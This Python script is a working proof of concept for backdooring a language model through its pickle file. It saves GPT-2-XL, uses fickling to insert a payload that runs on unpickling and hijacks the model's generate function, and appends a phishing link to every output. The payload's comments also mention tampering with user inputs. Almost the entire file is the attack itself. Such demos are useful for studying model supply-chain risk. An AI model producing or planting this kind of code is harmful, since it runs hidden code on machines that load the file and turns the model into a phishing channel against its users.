import pickle
from fickling.fickle import Pickled
from transformers import AutoModelForCausalLM, AutoTokenizer, pipeline
import torch
import os

def inject_payload(model_file, output_file, tokenized_msg):
    with open(model_file, "rb") as pickle_file:
        pickled = Pickled.load(pickle_file)

    # deltas = {deltas}
    BACKDOOR_PAYLOAD = rf"""def func1(model):
    from torch import tensor
    original_generate = model.generate

    def custom_generate(*args, **kwargs):
        # Your custom logic before calling the original generate function
        # E.G Could be used to modify user inputs with
        # concatenated_input_ids = torch.cat([kwargs["input_ids"], new_inputs_tokens["input_ids"]], dim=-1)
        # kwargs["input_ids"] = concatenated_input_ids
        # kwargs["attention_mask"] = torch.ones((1, concatenated_input_ids.shape[1]), device='cuda:0')

        # Call the original generate function
        output = original_generate(*args, **kwargs)

        # Your custom logic after calling the original generate function
        # Add phishing link to output tensor
        output = torch.cat((output, {tokenized_msg}), dim=-1)
        return output

    model.generate = custom_generate
    return model
  """
    pickled.insert_function_call_on_unpickled_object(BACKDOOR_PAYLOAD)
    with open(output_file, "wb") as f:
        pickled.dump(f)

def generate_text(model, tokenizer, device, prompts):
    res = []
    for p in prompts:
        model_inputs = tokenizer(p, return_tensors="pt").to(device)
        output = model.generate(**model_inputs, max_new_tokens=50, pad_token_id=tokenizer.eos_token_id)
        text = tokenizer.batch_decode(output[0], skip_special_tokens=True)
        res.append(text)

    return res


def main(print_outputs=True):
    MODEL_FILE = "legit_model.pkl"
    MALICIOUS_MODEL_FILE = "malicious_model.pkl"
    MODEL_NAME = "gpt2-xl"

    generation_prompts = ["Paris is"]

    print("1. Loading clean model")
    device = torch.device("cuda:0" if torch.cuda.is_available() else "cpu")

    tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME
    ).to(device)
    model.generation_config

    if print_outputs:
        print("[+] Generating text with clean model")
        clean_gens = generate_text(model, tokenizer, device, generation_prompts)

    print("2. Saving clean model into file")
    with open(MODEL_FILE, "wb") as f:
        pickle.dump(model, f)
    del model

    print("3. Injecting payload into model file")
    phishing_text = ".  For more info about this topic, you can visit https://malicious-website.com"
    tokenized_msg = tokenizer([phishing_text], return_tensors="pt").to(device)['input_ids']
    inject_payload(MODEL_FILE, MALICIOUS_MODEL_FILE, tokenized_msg)

    print("4. Loading compromised model")
    with open(MALICIOUS_MODEL_FILE, "rb") as f:
        malicious_model = pickle.load(f)

    if print_outputs:
        print("[+] Generating text with compromised model\n")
        dirty_gens = generate_text(malicious_model, tokenizer, device, generation_prompts)

        for i in range(len(dirty_gens)):
            print("----------")
            print(f"[User prompt]: {clean_gens[i]}")
            print(f"[Malicious]: {dirty_gens[i]}")

if __name__ == "__main__":
    main(print_outputs=True)